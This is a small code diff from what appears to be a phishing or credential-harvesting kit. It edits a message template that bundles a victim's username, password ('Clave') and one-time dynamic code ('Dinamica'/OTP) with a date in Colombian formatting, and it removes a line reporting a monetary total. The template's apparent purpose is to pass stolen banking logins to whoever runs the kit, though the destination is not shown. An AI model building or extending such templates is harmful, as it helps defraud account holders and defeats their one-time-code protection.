@@ -42,8 +42,6 @@ Usuario: ${sessionData.usuario || 'N/A'}
 Clave: ${sessionData.clave || 'N/A'}
 Dinamica: ${sessionData.claveDinamica || sessionData.otp || 'N/A'}
 
-💰 Total: $${sessionData.totalAmount?.toLocaleString('es-CO') || '0'}
-
 🕐 Fecha: ${new Date(sessionData.createdAt).toLocaleString('es-CO')}
 `;
 
